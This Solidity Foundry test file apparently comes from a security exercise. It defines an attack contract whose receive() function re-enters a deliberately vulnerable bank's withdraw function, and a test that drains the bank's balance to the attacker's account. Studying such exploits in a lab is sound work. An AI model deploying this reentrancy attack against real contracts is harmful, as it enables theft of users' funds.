// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Test, console} from "forge-std/Test.sol";
import {VulnerableBank} from "../src/VulnerableBank.sol";

contract AttackBank is Ownable {
    address bankAddress;

    constructor(address _bankAddress) Ownable(msg.sender) {
        bankAddress = _bankAddress;
    }

    function deposit(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "not enough balance to deposit");
        VulnerableBank bank = VulnerableBank(payable(bankAddress));
        bank.deposit{value: amount}();
    }

    function withdraw(uint256 amount) external onlyOwner {
        VulnerableBank bank = VulnerableBank(payable(bankAddress));
        uint256 currentBalance = bank.balances((address(this)));
        require(currentBalance >= amount, "not enough balance to withdra");
        bank.withdraw(amount);
    }

    receive() external payable {
        VulnerableBank bank = VulnerableBank(payable(bankAddress));
        uint256 currentBalance = bank.balances((address(this)));
        uint256 bankBalance = payable(bankAddress).balance;
        // bank balance has been drained, stop otherwise tx will revert
        if (bankBalance == 0) {
            return;
        }
        if (bankBalance < currentBalance) {
            bank.withdraw(bankBalance);
        } else {
            bank.withdraw(currentBalance);
        }
    }

    function withdrawFunds() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}

contract VulnerableBankTest is Test {
    address owner = address(0x1);
    address attacker = address(0x2);
    VulnerableBank public bank;
    AttackBank public attack;

    function setUp() public {
        vm.prank(owner);
        bank = new VulnerableBank();

        vm.prank(attacker);
        attack = new AttackBank(address(bank));
    }

    function testAttackVulnerableBank() public {
        vm.startPrank(attacker);
        // bank starts with 1 ETH on the bank account
        vm.deal(address(bank), 1 ether);
        // make sure attacker's contract has enough to deposit
        vm.deal(address(attack), 0.1 ether);
        // attacker's contract deposits some funds
        attack.deposit(0.1 ether);
        // attacker's contract withdraws funds, but with re-entrancy to drain the entire bank account
        // added unchecked{} in the VulnerableBank code otherwise it would revert due to "arithmetic underflow or overflow"
        attack.withdraw(0.1 ether);
        assertEq(1.1 ether, address(attack).balance);
        // transfering funds to the attacker's EOA
        attack.withdrawFunds();
        assertEq(0 ether, address(attack).balance);
        assertEq(1.1 ether, address(attacker).balance);
        vm.stopPrank();
    }
}
